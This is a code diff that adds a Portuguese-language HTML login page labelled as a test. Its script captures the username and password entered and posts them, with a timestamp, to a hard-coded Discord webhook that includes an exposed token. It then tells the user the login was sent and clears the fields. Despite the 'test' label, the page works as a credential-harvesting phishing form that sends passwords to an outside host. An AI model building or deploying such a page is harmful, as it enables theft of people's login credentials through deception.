@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+<style>
+body {
+  background: #121212;
+  color: #fff;
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+.login-container {
+  background: #1e1e1e;
+  padding: 30px;
+  border-radius: 10px;
+  text-align: center;
+  width: 300px;
+}
+input {
+  width: 90%;
+  padding: 10px;
+  margin: 10px 0;
+  border-radius: 5px;
+  border: none;
+}
+button {
+  padding: 10px 20px;
+  background: #03a9f4;
+  border: none;
+  border-radius: 5px;
+  color: #fff;
+  cursor: pointer;
+}
+button:hover { background: #0288d1; }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+  <h2>Login de Teste</h2>
+  <input type="text" id="username" placeholder="Usuário"><br>
+  <input type="password" id="password" placeholder="Senha"><br>
+  <button onclick="enviarLogin()">Entrar</button>
+  <p id="msg"></p>
+</div>
+
+<script>
+// 🔗 Cole aqui seu webhook do Discord
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1454696672180310067/zcKxndwhfk_5LnAcKFqzSxObbIjmlHBP2fAFWAyv8HHZVWtp320gpxgoJFcgXv1EqFcZ";
+
+function enviarLogin() {
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+
+  if(!user || !pass) {
+    document.getElementById("msg").textContent = "Preencha todos os campos!";
+    return;
+  }
+
+  // Envia dados para o webhook
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content:
+        `🔐 **Login do usuário**\n` +
+        `👤 Usuário: ${user}\n` +
+        `🔑 Senha: ${pass}\n` +
+        `🕒 ${new Date().toLocaleString()}`
+    })
+  });
+
+  document.getElementById("msg").textContent = "Login enviado para teste!";
+  document.getElementById("username").value = "";
+  document.getElementById("password").value = "";
+}
+</script>
+
+</body>
+</html>
